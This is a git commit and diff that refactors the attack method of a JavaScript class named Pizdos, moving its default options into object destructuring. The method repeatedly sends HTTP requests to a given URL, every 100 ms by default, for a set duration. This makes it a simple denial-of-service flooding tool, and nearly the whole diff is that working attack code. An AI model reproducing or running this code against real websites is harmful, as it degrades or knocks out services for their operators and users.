a35e9931587f607eb1046c14f54621892aeaab38
Vlad <flurescein@gmail.com>
2018-05-05 23:52:02 +0300

    Rewrote attack method with object destructuring.

--- src/pizdos.js
+++ src/pizdos.js
@@ -8,33 +8,22 @@ module.exports = class Pizdos {
      * @returns {void}
      * @public
      */
-    static attack(url, options) {
-        options = Object.assign(this.standardOptions, options)
-
-        options.log(`Attack started at ${new Date}.`)
+    static attack(url, {
+        duration = 60000,
+        frequency = 100,
+        log = console.log
+    } = {}) {
+        log(`Attack started at ${new Date}.`)
 
         setInterval(() =>
             r2(url).text
             .catch(error => {
                 throw 'Attack ended with an error.\n' + error
-            }), options.frequency)
+            }), frequency)
 
         setTimeout(() => {
-            options.log(`Attack complete at ${new Date}.`)
+            log(`Attack complete at ${new Date}.`)
             process.exit(0)
-        }, options.duration)
-    }
-
-    /**
-     * Constant with standard options.
-     * @returns {object}
-     * @private
-     */
-    static get standardOptions() {
-        return {
-            duration: 60000,
-            frequency: 100,
-            log: console.log
-        }
+        }, duration)
     }
 }
